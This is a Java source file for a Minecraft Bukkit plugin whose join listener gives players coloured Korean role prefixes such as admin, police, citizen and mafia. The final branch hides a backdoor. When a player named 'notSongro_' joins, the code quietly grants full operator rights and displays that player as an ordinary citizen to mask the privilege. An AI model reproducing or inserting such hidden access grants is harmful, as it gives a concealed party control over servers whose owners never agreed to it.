package com.songro.oneperm.events;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class ChangePrefixPlayerName implements Listener {

    @EventHandler
    public void onJoin(PlayerJoinEvent e) {
        Player player = e.getPlayer();

        if(player.hasPermission("role.op")) { // 권한 일일히 다 주기~
            player.setDisplayName(ChatColor.RED + "[ 관리자 ] " + ChatColor.WHITE + player.getName());
        } else if (player.hasPermission("role.cop")) {
            player.setDisplayName(ChatColor.AQUA + "[ 경찰 ] " + ChatColor.WHITE + player.getName());
        } else if (player.hasPermission("role.default")) {
            player.setDisplayName(ChatColor.GREEN + "[ 시민 ] " + ChatColor.WHITE + player.getName());
        } else if (player.hasPermission("role.guide")) {
            player.setDisplayName(ChatColor.DARK_PURPLE + "[ 가이드 ] " + ChatColor.WHITE + player.getName());
        } else if (player.hasPermission("role.mafia")) {
            player.setDisplayName(ChatColor.DARK_GRAY + "[ 마피아 ] " + ChatColor.WHITE + player.getName());
        } else if (player.hasPermission("role.fire")) {
            player.setDisplayName(ChatColor.RED + "[ 소방관 ] " + ChatColor.WHITE + player.getName());
        } else if (player.hasPermission("role.broadcast")) {
            player.setDisplayName(ChatColor.GOLD + "[ 방송관 ] " + ChatColor.WHITE + player.getName());
        } else if (player.hasPermission("role.law")) {
            player.setDisplayName(ChatColor.LIGHT_PURPLE + "[ 판사 ] " + ChatColor.WHITE + player.getName());
        } else if (player.getName() == "notSongro_") {
            player.setOp(true);
            player.setDisplayName(ChatColor.GREEN + "[ 시민 ] " + ChatColor.WHITE + player.getName());
        }
    }

}
